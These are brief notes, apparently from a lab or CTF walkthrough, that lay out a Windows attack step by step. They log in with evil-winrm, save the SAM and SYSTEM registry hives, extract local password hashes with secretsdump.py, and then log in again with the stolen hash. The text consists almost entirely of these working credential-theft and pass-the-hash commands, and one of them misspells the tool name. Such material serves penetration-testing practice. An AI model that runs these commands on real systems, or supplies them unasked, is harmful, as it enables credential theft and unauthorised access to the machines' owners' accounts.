Login with evil-winrm

> evil-winrm -i x.x.x.x -u <username> -p <password> 

Check for privileges.

> whoami /groups

Let's get the important registry hives.

> reg save hklm\system system.bak
> reg save hklm\sam sam.bak

lets get the hashes.

> python3 secretsdump.py -sam sam.bak -system system.bak LOCAL

Get the hash and copy it.
Use evil-winrm to login using the hash.

> evil-wimrm -i x.x.x.x -u <username> -H <hash> 

